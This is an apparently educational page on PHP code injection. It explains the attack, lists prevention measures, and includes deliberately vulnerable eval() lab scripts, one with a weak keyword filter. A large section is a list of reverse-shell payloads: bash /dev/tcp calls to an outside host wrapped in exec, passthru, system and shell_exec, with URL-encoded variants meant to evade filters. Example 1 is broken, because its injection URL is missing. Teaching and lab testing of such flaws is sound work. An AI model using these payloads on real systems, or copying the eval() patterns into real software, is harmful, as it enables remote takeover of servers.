# Code-Injection

## Code Injection

**Code Injection** is a cyberattack whereby an attacker inserts malicious code into an application that is then executed.  
This exploits poor handling of untrusted data due to lack of proper input/output validation, allowing attackers to alter application behavior, steal data, or take control of systems.

---

## What is Code Injection?

Code Injection attacks exploit vulnerabilities where user input is not properly **sanitized or validated**.  
The attacker injects malicious code in the application's programming language (e.g., PHP, SQL), and the application executes it, enabling unauthorized actions.  

Unlike command injection, where the attack leverages shell commands, code injection is only limited by the features of the injected language itself.

---

## Examples of Code Injection

### Example 1
In PHP, an application that uses a GET parameter directly in an `include()` function without validation can be exploited:

    http://testsite.com/index.php?page=contact.php


An attacker might inject code via:


This executes the attacker's remote PHP script.

---

### Example 2
Using PHP's `eval()` function unsafely by passing unfiltered user input:

    $myvar = "varname";
$x = $_GET['arg'];
eval("$myvar = $x;");

- An attacker can execute malicious code like:

      /index.php?arg=1; phpinfo()

## Types of Code Injection

- SQL Injection: Injecting malicious SQL queries to manipulate databases.

- Command Injection: Injecting system commands to be executed on the server.

- Cross-Site Scripting (XSS): Injecting malicious scripts into webpages viewed by other users.

- LDAP Injection: Manipulating LDAP queries for unauthorized access.

- XML Injection: Altering XML data or queries to change application behavior.

## How Code Injection Affects Organizations

- Impacts include:

- Data theft (credentials, payment info, sensitive data)

- Unauthorized system access and privilege escalation

- Service disruption and downtime

- Financial loss and reputational damage

## Detection Mechanisms

- Static Analysis: Scanning source code for unsafe coding practices before deployment.

- Dynamic Analysis: Testing running applications using simulated attacks.

- Runtime Protection: Real-time monitoring and blocking suspicious execution patterns.

- Input Validation: Strictly validating all user inputs against expected formats.

## Prevention Best Practices

- Input Sanitization: Filter and clean input to block dangerous characters.

- Parameterized Queries: Separate data from code logic in database queries to prevent SQL injection.

- Output Encoding: Encode user output to prevent execution of injected scripts (esp. for XSS).

- Content Security Policy (CSP): Browser-level policy to restrict unauthorized script execution.

- Use secure coding principles (e.g., avoid eval() and unsafe functions).

- Employ Web Application Firewalls (WAFs) for additional protection.

## Summary

Code Injection is a severe security threat exploiting improper input validation to execute dangerous code.
Awareness of attack types, rigorous coding practices, layered detection, and prevention measures are essential to defend against these attacks effectively.

- code-injection.php
      
      <!DOCTYPE html>
      <html>
      <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Code Injection</title>
      </head>
      <body>
      
      <pre>
      <?php
        $fun = $_REQUEST['fun'];
        echo $fun . "<br>";
        eval($fun . ";");
      ?>
      </pre>
      
      </body>
      </html>
      
## Description
   
    http://192.168.1.5/php/code-injection.php?fun=sleep(10)
    http://192.168.1.5/php/code-injection.php?fun=phpinfo()

This PHP script takes a parameter fun from the user request (via GET, POST, or COOKIE), outputs it verbatim to the page, and then executes it as PHP code using the unsafe eval() function.

- The line $fun = $_REQUEST['fun']; assigns the user-controlled input to the $fun variable.

- echo $fun "<brr>"; prints the raw input back to the browser without any modification or sanitization.

- The critical vulnerability lies in eval($fun . ";"); which executes the content of $fun directly as PHP code.

 > This creates a code injection vulnerability, because any PHP code supplied by an attacker in the fun parameter will be executed on the server. This can lead to arbitrary command execution, data theft, modification, or full system compromise.

The use of eval() on unsanitized user input is highly dangerous. While this code demonstrates how simple it can be to inject code, it is a critical security risk and should be avoided in real-world applications.

> This example serves educational purposes to highlight the risks and consequences of unsafe code execution through eval(), emphasizing the need for strict input validation, sanitization, and avoidance of such constructs in production code.

--------------

The critical vulnerability lies in eval($fun.";"), which executes the content of $fun directly as PHP code.

This creates a code injection vulnerability, because any PHP code supplied by an attacker in the fun parameter will be executed on the server. This can lead to arbitrary command execution, data theft, modification, or full system compromise.

The use of eval() on unsanitized user input is highly dangerous. While this code demonstrates how simple it can be to inject code, it is a critical security risk and should be avoided in real-world applications.

- This example serves educational purposes to highlight the risks and consequences of unsafe code execution through eval(), emphasizing the need for strict input validation, sanitization, and avoidance of such constructs in production code.
- Reverse Shell Commands=

      exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'")
    
      exec("/bin/bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/192.168.1.8/443%200%3E%261'")
      
      exec("/bin/bash%20-c%20bash%20-i%20%3E%26%20/dev/tcp/192.168.1.8/443%200%3E%261'")
      
      exec("%22%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20/dev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22")
      
      exec("%657%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22%29")
  
      
      passthru("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'")
      
      passthru("/bin/bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/192.168.1.8/443%200%3E%261'")
      
      passthru("/bin/bash%20-c%20bash%20-i%20%3E%26%20/dev/tcp/192.168.1.8/443%200%3E%261'")
      
      passthru("%22%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20/dev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22")
      
      passthru("%657%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22%29")
  
      
      system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'")
      
      system("/bin/bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/192.168.1.8/443%200%3E%261'")
      
      system("/bin/bash%20-c%20bash%20-i%20%3E%26%20/dev/tcp/192.168.1.8/443%200%3E%261'")
      
      system("%22%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20/dev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22")
      
      system("%657%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22%29")
  
      
      shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'")
      
      shell_exec("/bin/bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/192.168.1.8/443%200%3E%261'")
      
      shell_exec("/bin/bash%20-c%20bash%20-i%20%3E%26%20/dev/tcp/192.168.1.8/443%200%3E%261'")
      
      shell_exec("%22%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20/dev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22")
      
      shell_exec("%657%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27%22%29")
  
      
      ping -c 4 127.0.0.1
      
      ping%20-c%204%20127.0.0.1
  
      
      /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'
      
      %2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.8%2F443%200%3E%261%27
  
  
      
      popen("id", "r");
      popen("ping -c 4 127.0.0.1", "r");
      popen("ping -c 40 127.0.0.1", "r");

 -  Code-injection-3.php
        
        <!DOCTYPE html>
        <html>
        <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Code Injection</title>
        </head>
        <body>
        
        <form action="code-injection-3.php" method="POST">
            Function:<input type="text" name="fun"><br />
            <input type="submit" name="run" value="run">
        </form>
        
        <pre>
        <?php
            if (isset($_POST['fun'])) {
                $fun = $_POST['fun'];
        
                if (!preg_match('/exec|system|shell_exec/', $fun)) {
                    eval($fun.";");
                } else {
                    echo "Error";
                }
            }
        ?>
        </pre>
        
        </body>
        </html>

    
